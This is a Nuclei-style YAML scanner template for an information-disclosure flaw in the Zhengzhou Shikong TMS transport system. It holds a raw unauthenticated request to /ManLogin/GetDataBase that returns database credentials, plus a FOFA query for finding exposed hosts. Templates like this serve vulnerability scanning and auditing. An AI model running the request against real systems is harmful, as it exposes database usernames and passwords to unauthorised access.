http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - '"dataname":'
            - '"datausername":'
            - '"datauserpwd":'
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /ManLogin/GetDataBase HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
id: zhengzhoushikong-TMS-GetDataBase-Information-disclosure
info:
    author: Superhero
    description: |-
        fofa: body="/Images/ManLogin/name.png"
        郑州时空-TMS运输管理系统 GetDataBase 接口存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统内部数据库文件，泄露账号密码等重要凭证，导致网站处于极度不安全状态。
    name: 郑州时空-TMS运输管理系统 GetDataBase 信息泄露漏洞
    reference:
        - https://mp.weixin.qq.com/s/oamdB1iat8Jaf9FJFOakig?token=149170459&lang=zh_CN
    severity: medium
    tags:
        - Information disclosure
